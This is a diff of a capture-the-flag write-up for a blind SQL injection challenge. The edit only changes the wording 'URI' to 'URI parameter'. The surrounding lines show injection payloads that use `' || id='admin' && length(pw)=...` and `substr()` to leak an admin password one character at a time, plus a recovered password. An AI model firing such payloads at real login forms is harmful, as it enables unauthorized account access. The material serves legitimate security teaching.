@@ -29,7 +29,7 @@ First we have to reveal the length of the flag.
 
 ### Retrieving the password length
 
-If we provide the following URI:
+If we provide the following URI parameter:
 
 ```
 ?pw=' || id='admin' %26%26 length(pw)=1 -- -
@@ -53,7 +53,7 @@ Since the `Hello admin` message is not printed, we know that the resultant query
 
 That tells us that the length of the `pw` column is more than 1.
 
-If we keep increasing the length and provide the following URI:
+If we keep increasing the length and provide the following URI parameter:
 
 ```
 ?pw=' || id='admin' %26%26 length(pw)=8 -- -
@@ -85,7 +85,7 @@ Next, we can leak the password byte by byte using the `substr()` function.
 
 ![Pasted image 20240610125927](https://github.com/Kunull/Write-ups/assets/110326359/1f746f94-b19a-4867-8868-f8396aa3e375)
 
-If we provide the following URI:
+If we provide the following URI parameter:
 
 ```
 ?pw=' || id='admin' %26%26 substr(pw, 1, 1)='0' -- -
@@ -259,7 +259,7 @@ $ python .\orge_script.py
 [!] Final payload: ?pw=7b751aec
 ```
 
-Now, we can provide password URI:
+Now, we can provide password URI parameter:
 
 ```
 ?pw=7b751aec
